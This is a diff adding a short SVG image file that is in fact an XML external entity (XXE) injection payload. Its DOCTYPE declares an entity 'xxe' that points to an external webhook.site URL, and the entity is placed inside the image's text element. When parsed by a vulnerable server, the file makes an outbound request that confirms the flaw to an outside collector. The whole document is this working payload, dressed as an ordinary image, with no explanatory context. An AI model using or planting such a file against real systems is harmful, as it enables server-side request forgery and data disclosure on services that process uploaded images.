@@ -1,0 +1,6 @@
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "https://webhook.site/fae52539-9662-4e67-a842-2992484b3eb9">
+]>
+<svg xmlns="http://www.w3.org/2000/svg" width="1000" height="1000">
+  <text font-size="14" x="10" y="20">&xxe; yes you can do that</text>
+</svg>
